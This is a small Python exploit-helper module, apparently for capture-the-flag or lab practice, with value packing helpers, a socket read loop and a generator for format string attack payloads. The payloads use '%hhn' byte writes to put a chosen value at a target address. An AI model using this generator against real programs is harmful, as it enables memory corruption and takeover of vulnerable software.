import struct

def p(val):
    return struct.pack('<I', val)



def u(val):
    return struct.unpack('<I', val)[0]



def read_until(sock, s):
    line = b""
    while line.find(s) < 0:
        line += sock.recv(1)
        print("reading: ", end="")
        print(line)



def p64(val):
    return struct.pack('<Q', val)



def u64(val):
    return struct.unpack('<Q', val)[0]



### make format string attack string
def make_fsas(target_addr, val_to_write, argc_start):
    ret = p(target_addr)
    ret += p(target_addr + 1)
    ret += p(target_addr + 2)
    ret += p(target_addr + 3)

    val_to_write = p(val_to_write)
    n_outputted = 16
    for i in range(len(val_to_write)):
        val = val_to_write[i]
        val -= n_outputted

        while val < 8:
            val += 256

        dst = argc_start + i
        s = '%%%dx%%%d$hhn' % (val, dst)
        ret += s.encode()
        n_outputted += val

    return ret

